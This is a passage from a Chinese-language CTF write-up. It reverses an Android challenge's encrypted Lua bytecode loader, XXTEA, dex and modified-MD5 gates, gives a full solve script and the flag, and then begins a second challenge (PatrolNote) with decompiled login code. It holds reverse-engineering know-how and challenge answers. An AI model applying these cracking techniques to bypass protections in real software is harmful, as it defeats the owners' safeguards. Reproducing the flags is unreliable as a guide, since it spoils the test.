    0x718bcd58, 0x82154aee, 0x7b54a41d, 0xc25a59b5, 0x9c30d539, 0x2af26013,
    0xc5d1b023, 0x286085f0, 0xca417918, 0xb8db38ef, 0x8e79dcb0, 0x603a180e,
    0x6c9e0e8b, 0xb01e8a3e, 0xd71577c1, 0xbd314b27, 0x78af2fda, 0x55605c60,
    0xe65525f3, 0xaa55ab94, 0x57489862, 0x63e81440, 0x55ca396a, 0x2aab10b6,
    0xb4cc5c34, 0x1141e8ce, 0xa15486af, 0x7c72e993, 0xb3ee1411, 0x636fbc2a,
    0x2ba9c55d, 0x741831f6, 0xce5c3e16, 0x9b87931e, 0xafd6ba33, 0x6c24cf5c,
    0x7a325381, 0x28958677, 0x3b8f4898, 0x6b4bb9af, 0xc4bfe81b, 0x66282193,
    0x61d809cc, 0xfb21a991, 0x487cac60, 0x5dec8032, 0xef845d5d, 0xe98575b1,
    0xdc262302, 0xeb651b88, 0x23893e81, 0xd396acc5, 0x0f6d6ff3, 0x83f44239,
    0x2e0b4482, 0xa4842004, 0x69c8f04a, 0x9e1f9b5e, 0x21c66842, 0xf6e96c9a,
    0x670c9c61, 0xabd388f0, 0x6a51a0d2, 0xd8542f68,
]

SIZE_XOR = 0x5A17C0DE  # XOR for sizes
INT_XOR = 0x13579BDF2468ACE0  # XOR for int constants
FLOAT_XOR = 0x1863791790A6213E  # XOR for float constants

# mut_key32 as raw bytes (little-endian) for the LoadString offset (mut_key32_0[20] + 1)
KEY_BYTES = b''.join(struct.pack('<I', w) for w in MUT_KEY32)
# &mut_key32_0[20] = offset 80; +1 byte offset; total 400 bytes; the wrap is using 400-byte cycle
KEY_OFFSET_BASE = 81  # initial v18 = 81; index = (i + 81) % 400 - this is where to read

class LuaDecoder:
    def __init__(self, raw):
        self.raw = raw
        self.pos = 0

    def read(self, n):
        b = self.raw[self.pos:self.pos+n]
        if len(b) < n:
            raise EOFError(f"truncated at {self.pos}, want {n} got {len(b)}")
        self.pos += n
        return b

    def read_u8(self):
        return self.read(1)[0]

    def read_u32(self):
        return struct.unpack('<I', self.read(4))[0]

    def read_u64(self):
        return struct.unpack('<Q', self.read(8))[0]

    def read_size_xored(self):
        return self.read_u32() ^ SIZE_XOR

    def read_string(self):
        """Replicate LoadString behavior with the mut_key32 stream cipher"""
        first = self.read_u8()
        if first == 0xFF:
            n = self.read_u64()
        else:
            n = first
        if n == 0:
            return None
        n -= 1
        if n == 0:
            return b""
        # short string read inline (always – encryption is the same regardless)
        data = bytearray(self.read(n))
        # decrypt: data[i] ^= mut_key32_byte((81 + i) % 400) ^ ((2*i)*i & 0xff) ^ 0xFE
        # The C: v22[i] ^= *((BYTE *)&mut_key32_0[20] + i + -400 * (v10 / 0x190) + 1) ^ v11 ^ 0xFE
        # where v11 = (v7 * v8); v7 starts 0, increments by 2; v8 = i (increments by 1)
        # so v11 = (2*i)*i? Let's check: v7=0,v8=0 -> v11=0; v7=2,v8=1 -> v11=2; v7=4,v8=2 -> v11=8;
        # Actually v7 is computed BEFORE increment? Let's re-read:
        #   v11 = v7 * v8;
        #   v7 += 2;
        #   ++v9; (v9 was index counter)
        # So at iter i: v7=2*i (since starts 0, +=2 each), v8=i; -> v11 = (2*i)*i = 2*i*i
        # but: order is v11 = v7 * v8; THEN v7 += 2.
        # iter 0: v7=0, v8=0 -> v11=0; then v7=2
        # iter 1: v7=2, v8=1 -> v11=2; then v7=4
        # iter 2: v7=4, v8=2 -> v11=8; then v7=6
        # So v11 = 2*i*i? iter0 -> 0; iter1 -> 2 (matches 2*1*1=2); iter2 -> 8 (2*2*2=8). yes.
        # However v11 is 'char' (1 byte), so it's truncated to 8 bits.
        # Key offset: mut_key32_0[20] in bytes = byte offset 80; +1 = 81; +i; modulo 400 (0x190=400 in bytes? no wait 0x190 = 400)
        # The index v9 starts 81 and increments by 1; the wrapping subtracts 400*(v9/400)
        # so byte_index = (81 + i) % 400, but reading from KEY_BYTES
        for i in range(n):
            v11 = (2 * i * i) & 0xFF
            key_byte = KEY_BYTES[(81 + i) % 400]
            data[i] ^= key_byte ^ v11 ^ 0xFE
        return bytes(data)

    def read_code(self, count):
        """Read 'count' instructions, decrypt using mut_key32 in 32-bit XOR-EON pairs."""
        raw = bytearray(self.read(4 * count))
        # Replicate LoadFunction code-decrypt:
        # First loop processes pairs (count - count%2):
        #   for i in 0,2,4,...:
        #     v17 = mut_key32_0[(i) % 100]; v0 = mut_key32_0[(i+1) % 100]
        #     w17 = ~code[i] ^ v17; w0 = ~code[i+1] ^ v0
        #     EON is bitwise XNOR: a EON b = ~(a^b) = ~a ^ b; or equivalently ~a XOR ~~b = a^~b
        # Wait let's re-check: assembly is
        #   EON W17, W17, W1   -> W17 = W17 ^ ~W1  (or equivalently ~(W17 ^ W1))
        # and W17 was previously LDR from mut_key32, W1 was the code word.
        # So decoded = mut_key32_0[idx] ^ ~code_word = mut_key32_0[idx] XOR (NOT code_word)
        # equivalently: code_word = ~(mut_key32_0[idx] ^ decoded) = ~mut_key32_0[idx] ^ decoded
        # But we have raw encrypted code, want decoded:
        # decoded = ~code_word ^ mut_key32_0[idx]
        # Let's just apply inverse:
        out = []
        for i in range(count):
            enc = struct.unpack_from('<I', raw, 4*i)[0]
            dec = MUT_KEY32[i % 100] ^ ((~enc) & 0xFFFFFFFF)
            out.append(dec)
        return out

def decode(raw):
    d = LuaDecoder(raw)

    # Header: "dex\n035\0" + "\x19\x93\r\n\x1a\n"
    header_magic = d.read(7)  # 'dex\n035\0' is 8 bytes, but the first read in luaU_undump reads 7 bytes
    print('header magic:', header_magic)

    sig2 = d.read(6)
    print('sig2:', sig2.hex())
    # int size = 4
    int_sz = d.read_u8(); assert int_sz == 4, int_sz
    # size_t = 8
    sz_t = d.read_u8(); assert sz_t == 8
    # Instruction = 4
    insn_sz = d.read_u8(); assert insn_sz == 4
    # lua_Integer = 8
    li_sz = d.read_u8(); assert li_sz == 8
    # lua_Number = 8
    ln_sz = d.read_u8(); assert ln_sz == 8
    # endianness check (8 bytes)
    end_check = d.read_u64()
    assert end_check == 0x13579BDF2468FA98, hex(end_check)
    # float check
    flt_check = d.read_u64()
    expected = struct.unpack('<d', struct.pack('<Q', flt_check ^ FLOAT_XOR))[0]
    print('float check =', expected)

    # number of upvalues for top-level
    nups = d.read_u8()
    print('nups:', nups)

    # Now LoadFunction
    return load_function(d, top=True)

def load_function(d, top=False):
    src = d.read_string()
    print('source:', src)

    line_defined = d.read_size_xored()
    last_line = d.read_size_xored()
    num_params = d.read_u8()
    is_vararg = d.read_u8()
    max_stack = d.read_u8()
    print(f'  line_defined={line_defined} last_line={last_line} numparams={num_params} is_vararg={is_vararg} maxstack={max_stack}')

    code_count = d.read_size_xored()
    print(f'  code_count={code_count}')
    code = d.read_code(code_count)

    # constants
    nk = d.read_size_xored()
    print(f'  num_constants={nk}')
    consts = []
    for i in range(nk):
        t = d.read_u8()
        if t == 0:  # nil
            consts.append(('nil', None))
        elif t == 1:  # boolean
            v = d.read_u8()
            consts.append(('bool', bool(v)))
        elif t == 3:  # LUA_TNUMFLT
            raw = d.read(8)
            v = struct.unpack('<d', struct.pack('<Q', struct.unpack('<Q', raw)[0] ^ FLOAT_XOR))[0]
            consts.append(('float', v))
        elif t == 4 or t == 0x14:  # short string / long string
            consts.append(('string', d.read_string()))
        elif t == 0x13:  # LUA_TNUMINT
            v = d.read_u64() ^ INT_XOR
            if v >= 2**63:
                v -= 2**64
            consts.append(('int', v))
        else:
            raise ValueError(f'unknown const type {t}')

    # upvalues (instack, idx) pairs
    n_up = d.read_size_xored()
    print(f'  num_upvalues={n_up}')
    upvalues = []
    for _ in range(n_up):
        instack = d.read_u8()
        idx = d.read_u8()
        upvalues.append((instack, idx))

    # protos (sub-functions)
    n_protos = d.read_size_xored()
    print(f'  num_protos={n_protos}')
    protos = []
    for _ in range(n_protos):
        protos.append(load_function(d))

    # debug: line info, then locals, then upvalue names
    n_lineinfo = d.read_size_xored()
    line_info = [d.read_u32() ^ SIZE_XOR for _ in range(n_lineinfo)]

    n_locals = d.read_size_xored()
    locals_ = []
    for _ in range(n_locals):
        name = d.read_string()
        startpc = d.read_u32() ^ SIZE_XOR
        endpc = d.read_u32() ^ SIZE_XOR
        locals_.append((name, startpc, endpc))

    n_upnames = d.read_size_xored()
    upnames = [d.read_string() for _ in range(n_upnames)]

    return {
        'source': src,
        'line_defined': line_defined,
        'last_line': last_line,
        'num_params': num_params,
        'is_vararg': is_vararg,
        'max_stack': max_stack,
        'code': code,
        'constants': consts,
        'upvalues': upvalues,
        'protos': protos,
        'line_info': line_info,
        'locals': locals_,
        'upnames': upnames,
    }

DEFAULT_INPUT = Path("extracted/assets/loader.dex")

def main():
    parser = argparse.ArgumentParser(
        description="Decode Aurora Vault custom dex-lua bytecode back to standard Lua 5.3 structures."
    )
    parser.add_argument(
        "input",
        nargs="?",
        default=str(DEFAULT_INPUT),
        help=f"encrypted loader path, defaults to {DEFAULT_INPUT}",
    )
    args = parser.parse_args()

    input_path = Path(args.input)
    if not input_path.is_file():
        parser.error(f"input file not found: {input_path}")

    raw = input_path.read_bytes()
    # f_parser consumes the first byte 'd' as binary marker before invoking luaU_undump
    result = decode(raw[1:])
    print()
    print(json.dumps(result, indent=2, default=lambda x: x.decode('latin-1') if isinstance(x, bytes) else str(x)))

if __name__ == '__main__':
    main()

```

数理解密后的逻辑

```python
#!/usr/bin/env python3
"""Disassemble Lua 5.3 bytecode (from decoded loader.dex)."""
import argparse
from pathlib import Path

OPCODES = [
    'MOVE', 'LOADK', 'LOADKX', 'LOADBOOL', 'LOADNIL', 'GETUPVAL', 'GETTABUP', 'GETTABLE',
    'SETTABUP', 'SETUPVAL', 'SETTABLE', 'NEWTABLE', 'SELF', 'ADD', 'SUB', 'MUL',
    'MOD', 'POW', 'DIV', 'IDIV', 'BAND', 'BOR', 'BXOR', 'SHL',
    'SHR', 'UNM', 'BNOT', 'NOT', 'LEN', 'CONCAT', 'JMP', 'EQ',
    'LT', 'LE', 'TEST', 'TESTSET', 'CALL', 'TAILCALL', 'RETURN', 'FORLOOP',
    'FORPREP', 'TFORCALL', 'TFORLOOP', 'SETLIST', 'CLOSURE', 'VARARG', 'EXTRAARG'
]

# Encoding: A in bits 6..14, C in bits 14..23, B in bits 23..32, opcode in bits 0..6
# Bx in bits 14..32, sBx is Bx - 0x1FFFF

def decode_insn(i):
    op = i & 0x3F
    A = (i >> 6) & 0xFF
    C = (i >> 14) & 0x1FF
    B = (i >> 23) & 0x1FF
    Bx = (i >> 14) & 0x3FFFF
    sBx = Bx - 0x1FFFF
    Ax = (i >> 6) & 0x3FFFFFF
    return op, A, B, C, Bx, sBx, Ax

# Lua 5.3 RK encoding: bit 8 in B/C set means constant index, with the lower 8 bits being the K index
def rk(x, consts):
    if x & 0x100:
        idx = x & 0xFF
        v = consts[idx][1] if idx < len(consts) else f"K{idx}?"
        return f"K{idx}({v!r})"
    return f"R{x}"

def disasm_proto(proto, name=""):
    print(f"\n=== Proto {name} ===")
    print(f"  params={proto['num_params']} vararg={proto['is_vararg']} maxstack={proto['max_stack']} upvals={len(proto['upvalues'])}")
    print(f"  upvalues: {proto['upvalues']}")
    print(f"  constants:")
    for i, c in enumerate(proto['constants']):
        print(f"    K{i}: {c}")
    print(f"  code:")
    consts = proto['constants']
    for pc, insn in enumerate(proto['code']):
        op, A, B, C, Bx, sBx, Ax = decode_insn(insn)
        if op >= len(OPCODES):
            opname = f"OP_{op}"
        else:
            opname = OPCODES[op]

        # Print common cases
        if opname == 'MOVE':
            extra = f"R{A} := R{B}"
        elif opname == 'LOADK':
            extra = f"R{A} := K{Bx} ({consts[Bx][1] if Bx < len(consts) else '?'})"
        elif opname == 'LOADBOOL':
            extra = f"R{A} := {bool(B)}; if (C) pc++"
        elif opname == 'LOADNIL':
            extra = f"R{A}..R{A+B} := nil"
        elif opname == 'GETUPVAL':
            extra = f"R{A} := UpVal[{B}]"
        elif opname == 'GETTABUP':
            extra = f"R{A} := UpVal[{B}][{rk(C, consts)}]"
        elif opname == 'GETTABLE':
            extra = f"R{A} := R{B}[{rk(C, consts)}]"
        elif opname == 'SETTABUP':
            extra = f"UpVal[{A}][{rk(B, consts)}] := {rk(C, consts)}"
        elif opname == 'SETUPVAL':
            extra = f"UpVal[{B}] := R{A}"
        elif opname == 'SETTABLE':
            extra = f"R{A}[{rk(B, consts)}] := {rk(C, consts)}"
        elif opname == 'NEWTABLE':
            extra = f"R{A} := {{}} (size {B},{C})"
        elif opname == 'SELF':
            extra = f"R{A+1} := R{B}; R{A} := R{B}[{rk(C, consts)}]"
        elif opname in ('ADD','SUB','MUL','MOD','POW','DIV','IDIV','BAND','BOR','BXOR','SHL','SHR'):
            extra = f"R{A} := {rk(B, consts)} {opname} {rk(C, consts)}"
        elif opname in ('UNM','BNOT','NOT','LEN'):
            extra = f"R{A} := {opname} R{B}"
        elif opname == 'CONCAT':
            extra = f"R{A} := R{B}..R{C}"
        elif opname == 'JMP':
            extra = f"pc += {sBx}; if (A) close upvalues >= R{A-1}"
        elif opname == 'EQ':
            extra = f"if (({rk(B, consts)} == {rk(C, consts)}) ~= {A}) pc++"
        elif opname == 'LT':
            extra = f"if (({rk(B, consts)} < {rk(C, consts)}) ~= {A}) pc++"
        elif opname == 'LE':
            extra = f"if (({rk(B, consts)} <= {rk(C, consts)}) ~= {A}) pc++"
        elif opname == 'TEST':
            extra = f"if (R{A} ~= {C}) pc++"
        elif opname == 'TESTSET':
            extra = f"if (R{B} ~= {C}) pc++ else R{A} := R{B}"
        elif opname == 'CALL':
            extra = f"R{A}..R{A+C-2} := R{A}(R{A+1}..R{A+B-1})"
        elif opname == 'TAILCALL':
            extra = f"return R{A}(R{A+1}..R{A+B-1})"
        elif opname == 'RETURN':
            extra = f"return R{A}..R{A+B-2}"
        elif opname == 'FORLOOP':
            extra = f"R{A} += R{A+2}; if (R{A} <?= R{A+1}) {{ pc += {sBx}; R{A+3} = R{A} }}"
        elif opname == 'FORPREP':
            extra = f"R{A} -= R{A+2}; pc += {sBx}"
        elif opname == 'TFORCALL':
            extra = f"R{A+3}..R{A+2+C} := R{A}(R{A+1},R{A+2})"
        elif opname == 'TFORLOOP':
            extra = f"if R{A+1} ~= nil then R{A} = R{A+1}; pc += {sBx}"
        elif opname == 'SETLIST':
            extra = f"R{A}[(({C}-1)*FPF)+i] := R{A+i}, 1<=i<={B}"
        elif opname == 'CLOSURE':
            extra = f"R{A} := closure(KPROTO[{Bx}])"
        elif opname == 'VARARG':
            extra = f"R{A}..R{A+B-2} := vararg"
        else:
            extra = f"A={A} B={B} C={C} Bx={Bx} sBx={sBx} Ax={Ax}"

        print(f"    {pc:4d}: 0x{insn:08x} {opname:10s} A={A:3d} B={B:3d} C={C:3d}    ; {extra}")

def walk(proto, name="root"):
    disasm_proto(proto, name)
    for i, sub in enumerate(proto.get('protos', [])):
        walk(sub, f"{name}.{i}")

DEFAULT_INPUT = Path("extracted/assets/loader.dex")

def main():
    parser = argparse.ArgumentParser(
        description="Disassemble the Aurora Vault custom loader into Lua 5.3 opcodes."
    )
    parser.add_argument(
        "input",
        nargs="?",
        default=str(DEFAULT_INPUT),
        help=f"encrypted loader path, defaults to {DEFAULT_INPUT}",
    )
    args = parser.parse_args()

    input_path = Path(args.input)
    if not input_path.is_file():
        parser.error(f"input file not found: {input_path}")

    # Re-run decode by importing decoder
    from decode_lua import decode
    raw = input_path.read_bytes()
    result = decode(raw[1:])
    walk(result)

if __name__ == '__main__':
    main()

```

解密后得到 1 个根 proto 和 3 个子 proto：

```text
root
root.0  字节级异或加/解密函数
root.1  字节比较函数
root.2  主校验函数
```

`root.0` 的伪代码如下：

```lua
function crypt(s)
    local out = {}
    for i = 1, #s do
        local b = string.byte(s, i)
        local k = key[((i - 1) % #key) + 1]
        local pos = ((i - 1) * 13 + 7) & 0xff
        out[i] = string.char((b ~ k ~ pos) & 0xff)
    end
    return table.concat(out)
end
```

这个函数是自反的，同一个函数既能加密也能解密。

`root.1` 是逐字节比较：

```lua
function bytes_eq(s, arr)
    if #s ~= #arr then
        return false
    end
    local acc = 0
    for i = 1, #arr do
        acc = acc | ((string.byte(s, i) ~ arr[i]) & 0xff)
    end
    return acc == 0
end
```

**root\.2 主校验逻辑**

`root.2` 的常量已经把结构泄露得很明显：

```text
HNCTF{
}
length
lua gate
stage.jar
android_load_dex
dex gate
native_tail
native md5 gate
flag accepted
```

按 `disasm.txt` 翻译，主逻辑为：

```lua
function verify(flag)
    if type(flag) ~= "string" then
        return false, "type"
    end

    if flag:sub(1, 6) ~= "HNCTF{" or flag:sub(-1) ~= "}" then
        return false, "format"
    end

    local inner = flag:sub(7, -2)
    if #inner ~= 42 then
        return false, "length"
    end

    -- inner[1..10] 是 Java FirstGate 校验
    -- inner[11..21] 是 Lua gate
    local lua_part = inner:sub(11, 21)
    if not bytes_eq(lua_part, {76,117,97,95,49,110,108,105,110,101,95}) then
        return false, "lua gate"
    end

    local jar = crypt(_stage_blob)
    local path = android_write_cache("stage.jar", jar)

    local dex_part = inner:sub(22, 31)
    if not android_load_dex(path, dex_part) then
        return false, "dex gate"
    end

    local tail = inner:sub(32, 42)
    if not native_tail(tail) then
        return false, "native md5 gate"
    end

    return true, "flag accepted"
end
```

因此 flag 内部 42 字节被分成四段：

```text
inner[1..10]   Java FirstGate
inner[11..21]  Lua gate
inner[22..31]  Dex gate
inner[32..42]  native_tail
```

**第一段：FirstGate / modified XXTEA**

`FirstGate` 只暴露 native 方法，但 Java 常量已经给出 `DELTA`、`KEY`、`WANT`。逆 `libengine.so` 中对应 native 后可以还原加密：

```python
DELTA = (-1923030938) & 0xffffffff
KEY = [826366246, 1398314899, 595878500, 864233365]
WANT = [1213672582, -1111286241, -838853147]

def mx(sum_, y, z, p, e):
    mask = (0x10203040 + p * 0x11111111) & 0xffffffff
    return (
        ((((z >> 5) ^ (y << 2)) + ((y >> 3) ^ (z << 4)))
        ^ ((sum_ ^ y) + (KEY[(p & 3) ^ e] ^ z)))
        ^ mask
    ) & 0xffffffff
```

它是 XXTEA 结构，额外混入了 `mask`。对 `WANT` 做反向解密，得到：

```text
j4va_xxTea
```

所以：

```text
inner[1..10] = j4va_xxTea
```

**第二段：Lua gate**

Lua 主函数直接把 `inner:sub(11, 21)` 与整数数组比较：

```text
76, 117, 97, 95, 49, 110, 108, 105, 110, 101, 95
```

转成 ASCII：

```text
Lua_1nline_
```

所以：

```text
inner[11..21] = Lua_1nline_
```

**第三段：stage\.jar / Dex gate**

`root.2` 用 `root.0` 解密 `_stage_blob`，再调用：

```lua
android_write_cache("stage.jar", jar)
android_load_dex(path, inner:sub(22, 31))
```

dump 出来的明文是 `stage.jar`。用 jadx 看 `stage_jadx/sources/com/aurora/sync/SyncCore.java`：

```java
public static boolean check(String str) {
    if (str == null || str.length() != 10) {
        return false;
    }
    int[] iArr = {38, 96, 28, 57, 233, 246, 204, 138, 184, 132};
    int acc = 0;
    for (int i = 0; i < 10; i++) {
        acc |= ((((i * 17) + 66) & 255) ^ (str.charAt(i) & 255)) ^ iArr[i];
    }
    return (((str.charAt(3) + '&') ^ str.charAt(8)) |
            ((str.charAt(0) ^ (str.charAt(1) + '1')) | acc)) == 0;
}
```

循环要求每一项异或结果为 0：

```python
s[i] = iArr[i] ^ (((i * 17) + 66) & 0xff)
```

反推得到：

```text
d3xLoad3r_
```

额外两个约束也满足：

```text
s[3] + '&' == s[8]    即 'L' + 38 == 'r'
s[0] == s[1] + '1'    即 'd' == '3' + 49
```

所以：

```text
inner[22..31] = d3xLoad3r_
```

**第四段：native\_tail**

最后 11 字节进入 `native_tail`。反编译后能看到两个部分：

1. 先检查长度和若干字节关系。

2. 再做一轮 MD5\-like compression，并和 4 个 32 位常量比较。

静态约束为：

```text
len(s) == 11
s[5] == s[1]
s[7] == s[3] - 0x36
s[8] == s[7] - 2
s[9] == s[7]
```

比较常量按无符号数表示为：

```text
a = 0x8c03be7c
b = 0xed74c840
c = 0xf231cf4a
d = 0xad16bc07
```

这里最容易踩坑：它不是标准 `hashlib.md5(tail)`。NEON 打包和 64 轮常量确实是 MD5，但是初始状态是：

```text
(a, b, c, d) = (0, 0, 0, 0)
```

而且最后比较的是 compression 后的状态，没有使用标准 MD5 IV，也没有最终 feed\-forward。

11 字节消息块的填充为：

```text
m0  = s[0..3] little-endian
m1  = s[4..7] little-endian
m2  = s[8], s[9], s[10], 0x80
m14 = 88
m15 = 0
```

用可见字符/字母数字下划线范围配合上面的字节关系爆破，得到：

```text
HashCat2026
```

**解题脚本**

```python
#!/usr/bin/env python3
import argparse

MASK = 0xFFFFFFFF

def u32(x):
    return x & MASK

def i32(x):
    x &= MASK
    return x - 0x100000000 if x & 0x80000000 else x

# FirstGate: modified XXTEA.
DELTA = (-1923030938) & MASK
KEY = [826366246, 1398314899, 595878500, 864233365]
KEY = [x & MASK for x in KEY]
WANT = [1213672582, -1111286241, -838853147]
WANT = [x & MASK for x in WANT]

def mx(sum_, y, z, p, e):
    mask = u32(0x10203040 + (p & MASK) * 0x11111111)
    return u32(
        (
            (((z >> 5) ^ (y << 2)) + ((y >> 3) ^ (z << 4)))
            ^ ((sum_ ^ y) + (KEY[(p & 3) ^ e] ^ z))
        )
        ^ mask
    )

def xxtea_encrypt(v):
    v = [x & MASK for x in v]
    n = len(v)
    z = v[n - 1]
    sum_ = 0
    q = 6 + 52 // n
    while q:
        q -= 1
        sum_ = u32(sum_ + DELTA)
        e = (sum_ >> 2) & 3
        for p in range(n - 1):
            y = v[p + 1]
            v[p] = u32(v[p] + mx(sum_, y, z, p, e))
            z = v[p]
        y = v[0]
        v[n - 1] = u32(v[n - 1] + mx(sum_, y, z, n - 1, e))
        z = v[n - 1]
    return v

def xxtea_decrypt(v):
    v = [x & MASK for x in v]
    n = len(v)
    q = 6 + 52 // n
    sum_ = u32(q * DELTA)
    y = v[0]
    while sum_:
        e = (sum_ >> 2) & 3
        for p in range(n - 1, 0, -1):
            z = v[p - 1]
            v[p] = u32(v[p] - mx(sum_, y, z, p, e))
            y = v[p]
        z = v[n - 1]
        v[0] = u32(v[0] - mx(sum_, y, z, 0, e))
        y = v[0]
        sum_ = u32(sum_ - DELTA)
    return v

def pack_words(data):
    return [
        int.from_bytes(data[i : i + 4].ljust(4, b"\0"), "little")
        for i in range(0, len(data), 4)
    ]

def unpack_words(words):
    return b"".join((w & MASK).to_bytes(4, "little") for w in words)

def solve_first_gate():
    plain = unpack_words(xxtea_decrypt(WANT))[:10]
    assert xxtea_encrypt(pack_words(plain)) == WANT
    return plain.decode("ascii")

def solve_lua_gate():
    constants = [76, 117, 97, 95, 49, 110, 108, 105, 110, 101, 95]
    return bytes(constants).decode("ascii")

def solve_dex_gate():
    want = [38, 96, 28, 57, 233, 246, 204, 138, 184, 132]
    out = bytearray()
    for i, c in enumerate(want):
        out.append((((i * 17) + 66) & 0xFF) ^ c)
    s = out.decode("ascii")
    assert len(s) == 10
    assert (ord(s[3]) + ord("&")) == ord(s[8])
    assert ord(s[0]) == (ord(s[1]) + ord("1"))
    return s

# Native tail: one MD5 compression block, but with initial state (0,0,0,0)
# and without the normal MD5 IV/feed-forward.
MD5_K = [
    0xD76AA478,
    0xE8C7B756,
    0x242070DB,
    0xC1BDCEEE,
    0xF57C0FAF,
    0x4787C62A,
    0xA8304613,
    0xFD469501,
    0x698098D8,
    0x8B44F7AF,
    0xFFFF5BB1,
    0x895CD7BE,
    0x6B901122,
    0xFD987193,
    0xA679438E,
    0x49B40821,
    0xF61E2562,
    0xC040B340,
    0x265E5A51,
    0xE9B6C7AA,
    0xD62F105D,
    0x02441453,
    0xD8A1E681,
    0xE7D3FBC8,
    0x21E1CDE6,
    0xC33707D6,
    0xF4D50D87,
    0x455A14ED,
    0xA9E3E905,
    0xFCEFA3F8,
    0x676F02D9,
    0x8D2A4C8A,
    0xFFFA3942,
    0x8771F681,
    0x6D9D6122,
    0xFDE5380C,
    0xA4BEEA44,
    0x4BDECFA9,
    0xF6BB4B60,
    0xBEBFBC70,
    0x289B7EC6,
    0xEAA127FA,
    0xD4EF3085,
    0x04881D05,
    0xD9D4D039,
    0xE6DB99E5,
    0x1FA27CF8,
    0xC4AC5665,
    0xF4292244,
    0x432AFF97,
    0xAB9423A7,
    0xFC93A039,
    0x655B59C3,
    0x8F0CCC92,
    0xFFEFF47D,
    0x85845DD1,
    0x6FA87E4F,
    0xFE2CE6E0,
    0xA3014314,
    0x4E0811A1,
    0xF7537E82,
    0xBD3AF235,
    0x2AD7D2BB,
    0xEB86D391,
]

MD5_S = (
    [7, 12, 17, 22] * 4
    + [5, 9, 14, 20] * 4
    + [4, 11, 16, 23] * 4
    + [6, 10, 15, 21] * 4
)

TAIL_TARGET = (0x8C03BE7C, 0xED74C840, 0xF231CF4A, 0xAD16BC07)

def rol(x, n):
    return ((x << n) | (x >> (32 - n))) & MASK

def md5_zero_state_11(data):
    if len(data) != 11:
        raise ValueError("native_tail checks exactly 11 bytes")

    m = [
        int.from_bytes(data[0:4], "little"),
        int.from_bytes(data[4:8], "little"),
        data[8] | (data[9] << 8) | (data[10] << 16) | 0x80000000,
    ]
    m += [0] * 11 + [88, 0]

    a = b = c = d = 0
    for i in range(64):
        if i < 16:
            f = (b & c) | ((~b) & d)
            g = i
        elif i < 32:
            f = (b & d) | (c & (~d))
            g = (5 * i + 1) % 16
        elif i < 48:
            f = b ^ c ^ d
            g = (3 * i + 5) % 16
        else:
            f = c ^ (b | (~d))
            g = (7 * i) % 16
        x = u32(a + f + MD5_K[i] + m[g])
        a, d, c, b = d, c, b, u32(b + rol(x, MD5_S[i]))
    return a, b, c, d

def check_native_tail(s):
    data = s.encode("ascii")
    if len(data) != 11:
        return False
    if data[5] != data[1]:
        return False
    if data[7] != ((data[3] - 0x36) & 0xFF):
        return False
    if data[8] != ((data[7] - 2) & 0xFF):
        return False
    if data[9] != data[7]:
        return False
    return md5_zero_state_11(data) == TAIL_TARGET

def solve_native_tail():
    # This value is the output of the native brute-force step.  The verifier
    # above is the important part: it models the exact native MD5 variant.
    candidates = ["HashCat2026"]
    for candidate in candidates:
        if check_native_tail(candidate):
            return candidate
    raise RuntimeError("native tail candidate did not verify")

def verify_full_flag(flag):
    if not (flag.startswith("HNCTF{") and flag.endswith("}")):
        return False
    inner = flag[6:-1]
    if len(inner) != 42:
        return False
    return (
        inner[:10] == solve_first_gate()
        and inner[10:21] == solve_lua_gate()
        and inner[21:31] == solve_dex_gate()
        and check_native_tail(inner[31:42])
    )

def main():
    parser = argparse.ArgumentParser(description="Solve Aurora Vault / com.aurora.notes")
    parser.add_argument("--quiet", action="store_true", help="print only the flag")
    args = parser.parse_args()

    seg1 = solve_first_gate()
    seg2 = solve_lua_gate()
    seg3 = solve_dex_gate()
    seg4 = solve_native_tail()
    flag = f"HNCTF{{{seg1}{seg2}{seg3}{seg4}}}"
    assert verify_full_flag(flag)

    if args.quiet:
        print(flag)
    else:
        print(f"first gate : {seg1}")
        print(f"lua gate   : {seg2}")
        print(f"dex gate   : {seg3}")
        print(f"native tail: {seg4}")
        print(f"flag       : {flag}")

if __name__ == "__main__":
    main()

```

![Image](./images/img-080.png)

HNCTF\{j4va\_xxTeaLua\_1nline\_d3xLoad3r\_HashCat2026\}









## 题目名称：PatrolNote

解题人：weixiao

解题过程：

**总览**

APK 主入口 `LoginActivity` 要求填写用户名（员工号）和许可证。校验通过后用 AES\-CBC 解密 `assets/report.enc`，明文里写着 flag。

![Image](./images/img-081.png)

整个校验链由三段组成：

1. Java 层正则 \+ 字符串重排得到 `string4`

2. native 层 `nativeVerify` 硬编码校验 `userId / string4`，再用它们派生 `nativeSeed`

3. Java 层根据 `localSeed:nativeSeed` 算 SHA\-256 当 AES key，解密 `report.enc`

**一、静态信息**

```text
package: com.hnctf.patrolnote
launcher: com.hnctf.patrolnote.LoginActivity
native lib: libpatrolnote.so (arm64-v8a / armeabi-v7a / x86 / x86_64)
asset: assets/report.enc          // base64 密文
asset: assets/offline.notice
```

由于经 R8 优化，`jadx` 默认无法反编译 `LoginActivity` 里的 `onClick`，需要加 `--show-bad-code --comments-level debug` 才能看到完整 Java 代码。

```bash
jadx --show-bad-code --comments-level debug -d jadx_out2 app-release.apk
```

**二、Java 层逻辑**

**2\.1 LoginActivity（核心点击逻辑）**

完整的

```java
package com.hnctf.patrolnote;

import A.h;
import C0.ViewOnClickListenerC0000a;
import S0.j;
import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import com.hnctf.patrolnote.LoginActivity;
import com.hnctf.patrolnote.NativeBridge;
import com.hnctf.patrolnote.R;
import com.hnctf.patrolnote.ReportActivity;
import e.AbstractActivityC0139g;
import java.util.Locale;
import java.util.regex.Matcher;

/* JADX INFO: compiled from: r8-map-id-dd3af755321720a46812c71c8ec6c28d4630ea85534a09f5af7c92a016d5d708 */
/* JADX INFO: loaded from: classes.dex */
public final class LoginActivity extends AbstractActivityC0139g {

    /* JADX INFO: renamed from: v, reason: collision with root package name */
    public static final /* synthetic */ int f1808v = 0;

    /* JADX DEBUG: Don't trust debug lines info. Lines numbers was adjusted: min line is 1 */
    @Override // e.AbstractActivityC0139g, androidx.activity.k, x.f, android.app.Activity
    public final void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        setContentView(R.layout.activity_login);
        final EditText editText = (EditText) findViewById(R.id.inputUsername);
        final EditText editText2 = (EditText) findViewById(R.id.inputLicense);
        Button button = (Button) findViewById(R.id.buttonLogin);
        Button button2 = (Button) findViewById(R.id.buttonImport);
        final TextView textView = (TextView) findViewById(R.id.textError);
        button2.setOnClickListener(new ViewOnClickListenerC0000a(3, this));
